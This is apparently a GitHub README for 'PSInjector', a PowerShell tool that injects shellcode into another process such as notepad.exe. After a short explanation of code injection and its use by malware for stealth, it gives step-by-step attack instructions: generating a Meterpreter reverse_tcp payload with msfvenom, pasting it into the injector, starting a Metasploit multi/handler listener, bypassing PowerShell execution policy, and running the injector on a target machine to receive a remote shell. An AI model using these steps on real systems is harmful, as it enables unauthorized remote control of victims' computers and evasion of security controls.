# PSInjector
Code injection is a technique where a process can insert a part of or all of its code from its own running process into another target process and get the target process to execute the injected code.


![image](https://user-images.githubusercontent.com/68971838/210256124-30b065df-ff35-4a5a-af9e-6d956c6be52a.png)

Code Injection Motives

Code injection is performed in both user mode and kernel mode. Malware mainly uses code injection for the following reasons.

• Hiding their presence, also known as stealth 

• Process piggybacking 

• Altering functionality of another process or entire OS


Steps for Code Injection
Code injection is largely handled in the following steps.

1. Locate the target for code injection. 

2. Inject the code. 
  
  a. Allocate/create memory/space in the target process of virtual memory. 
  
  b. Write/inject code into the allocated memory/space in the target 

3. Execute the injected code in the target.


This is a script written in PowerShell that injects a payload into another process. The payload is in the form of an array of bytes and is injected into the process with the ID specified by the $procId variable. in our case is notepad.exe

The LookupFunc function is used to get the address of a function in a dynamic-link library (DLL). It takes a DLL name and the name of a function as input and returns the address of the function. The getDelegateType function is used to create a delegate type for a function. A delegate is a type that represents a reference to a method.

The OpenProcess function is used to get a handle to the process with the specified ID. The VirtualAllocEx function is used to allocate memory within the virtual address space of the process. The WriteProcessMemory function is used to write the payload to the memory that was allocated. Finally, the CreateRemoteThread function is used to create a thread that runs in the context of the process and begins execution at the specified memory address.


First we need the shellcode, to create shellcode we will use msfvenom:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1

copy the shellcode and paste it in the injector like so:
![image](https://user-images.githubusercontent.com/68971838/210256780-c6cb4897-9a04-4515-acce-8ae28705aef2.png)


Now set up a listener in the Metasploit Framework (MSF), you first need to start the MSF console:

msfconsole

use multi/handler

set PAYLOAD windows/x64/meterpreter/reverse_tcp 

set LHOST IP

set LPORT PORT


Now run the injector on the target machine:

Note:
If you have a script that you need to run and the execution policy is set to Restricted, you can bypass the execution policy:
Set-ExecutionPolicy Unrestricted

Now run in powershell prompt:
./PSinjector

and check ur listener:

![image](https://user-images.githubusercontent.com/68971838/210256969-2ca9869f-7781-4888-88f4-fe7bb5a8b6bc.png)


Author: SPNl48 :)))

jenna Ortega fan 


